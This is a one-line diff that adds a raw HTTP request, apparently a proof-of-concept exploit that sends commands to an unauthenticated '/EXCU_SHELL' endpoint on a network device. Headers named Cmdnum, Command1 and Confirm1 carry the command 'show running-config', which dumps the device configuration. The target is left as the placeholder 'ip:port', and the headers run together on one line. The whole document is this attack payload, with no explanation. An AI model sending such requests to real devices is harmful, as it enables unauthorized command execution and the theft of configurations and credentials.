@@ -1,0 +1,1 @@
+GET /EXCU_SHELL HTTP/1.1Host: ip:port User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko) Version/12.0.3 Safari/605.1.15 Cmdnum: 1 Command1: show running-config Confirm1: n Accept-Encoding: gzip
